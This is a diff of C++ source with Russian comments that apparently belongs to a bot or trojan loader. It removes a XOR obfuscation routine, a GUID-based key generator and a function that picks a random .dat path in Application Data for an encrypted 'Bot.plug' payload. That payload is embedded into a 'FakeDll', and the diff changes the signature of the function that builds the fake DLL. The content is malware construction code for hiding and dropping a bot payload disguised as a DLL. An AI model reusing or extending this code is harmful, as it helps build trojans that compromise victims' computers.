@@ -28,67 +28,6 @@ namespace LDRDEBGTEMPLATES
 
 extern unsigned char fakeDllData[]; //fake.dll
 
-// Простое шифрование путем XOR. 
-// Сделана отдельно, чтобы скопировать в FakeDll и гарантировано 
-// оно было одинаково
-void XorCrypt(const LPBYTE Key, DWORD KeySize, LPBYTE Buffer, DWORD Size)
-{
-	DWORD a = 0;
-
-	while (a < Size)
-	{
-		DWORD b = 0;
-		while (b < KeySize)
-		{
-			Buffer[a] ^= (Key[b] + (a * b));
-			b++;
-		}
-		a++;
-	}
-}
-
-// Генерация случайного ключа размером 16 байт
-// Используется системная ф-ция создания GUID
-// Возвращает структуру GUID
-GUID GenerateCryptKey()
-{
-	GUID key;
-
-	m_memset(&key, 0, sizeof(key));
-	pCoCreateGuid(&key);
-	return key;
-}
-
-// Герерация случайного пути к шифрованному файлу Bot.plug, 
-// который будет вшиватся в FakeDll
-// Может завершится неудачей в случае неуспешной отработки системных ф-ций
-bool GenerateRandomPlugPath(wstring& Path)
-{
-	WCHAR PathBuffer[2* MAX_PATH];
-	BOOL  DirectoryObtained = FALSE;
-
-	// Получаем путь к "Documents and Settings\username\Application Data"
-	m_memset(PathBuffer, 0, sizeof(PathBuffer));
-	DirectoryObtained = (BOOL)pSHGetSpecialFolderPathW(NULL, PathBuffer, CSIDL_COMMON_APPDATA, false);
-	if (DirectoryObtained == FALSE) return false;
-
-	Path += PathBuffer;
-	Path += L"\\";
-
-	// Генерируем уникальное имя файла
-	wstring Name; 
-	GUID    Uuid = GenerateCryptKey();
-	LPBYTE  UuidPtr = (LPBYTE)&Uuid;
-
-	Name.Format(L"%02X%02X%02X%02X%02X%02X.dat", 
-		UuidPtr[0], UuidPtr[1], UuidPtr[2], UuidPtr[3], UuidPtr[4], UuidPtr[5]
-		);
-	
-	Path += Name;
-
-	return true;
-}
-
 // Ф-ция поиска заданного якоря для буффере
 // 
 // Возвращает указатель на найденный буффер или NULL, если найти не удалось
@@ -112,7 +51,7 @@ LPBYTE LookupAnchor(const LPVOID Buffer, DWORD BufferSize, const LPBYTE Anchor, 
 // Возвращает ненулевое значение, если всё встроилось нормально и 
 // NULL - если произошли ошибки
 LPBYTE CreateFakeDllWithBuiltingSettings(
-	const GUID & CryptKey,
+	const char* CryptKey,
 	const wstring& DllName,
 	const wstring& BotPlugPath,
 	const LPVOID DllBody,
